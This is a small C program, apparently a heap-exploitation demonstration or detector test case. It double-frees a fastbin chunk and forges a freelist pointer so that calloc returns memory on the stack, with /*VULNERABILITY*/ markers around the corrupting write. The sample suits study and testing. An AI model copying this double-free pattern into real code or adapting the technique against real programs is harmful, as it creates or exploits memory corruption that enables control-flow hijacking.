
#include <stdlib.h>
#include <assert.h>
int main()
{
	void *ptrs[7];
	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i = 0; i < 7; i++) {
		free(ptrs[i]);
	}
	unsigned long long stack_var;
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);
	//First call to free will add a reference to the fastbin
	free(a);
	free(b);
	//Calling free(a) twice renders the program vulnerable to Double Free
	free(a);
	unsigned long long *d = calloc(1, 8);
	calloc(1, 8);
	stack_var = 0x20;
	/*VULNERABILITY*/
	*d = (unsigned long long) (((char *)&stack_var) - sizeof(d));
	/*VULNERABILITY*/
	calloc(1, 8);
	void *p = calloc(1, 8);
	assert(p == 8 + (char *)&stack_var);
	// assert((long)__builtin_return_address(0) == *(long *)p);
}
